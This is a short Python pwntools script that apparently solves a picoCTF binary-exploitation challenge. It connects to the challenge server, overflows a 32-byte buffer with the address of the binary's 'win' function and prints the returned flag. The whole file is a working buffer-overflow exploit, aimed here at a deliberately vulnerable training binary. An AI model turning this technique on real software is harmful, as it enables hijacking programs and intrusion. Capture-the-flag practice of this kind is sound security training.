from pwn import *

bin='./chall'
context.binary=bin
#Offline version for testing
#p=process(bin)

#Online version for getting the flag, modify the port accordingly
p=remote('mimas.picoctf.net',50580)
e=ELF(bin)
win_addr=e.symbols[b"win"]
log.info(f"win address: {win_addr}")
log.info("hex for win is: 0x:{:016x}".format(win_addr))

payload=b'A'*32+p64(win_addr)
p.recvuntil(b"Enter your choice: ")
p.sendline(b'2')
p.recvuntil(b"Data for buffer: ")
p.sendline(payload)
p.recvuntil(b"Enter your choice: ")
p.sendline(b'4')
flag = p.recvline(timeout=2)
print(flag.decode())
p.close()
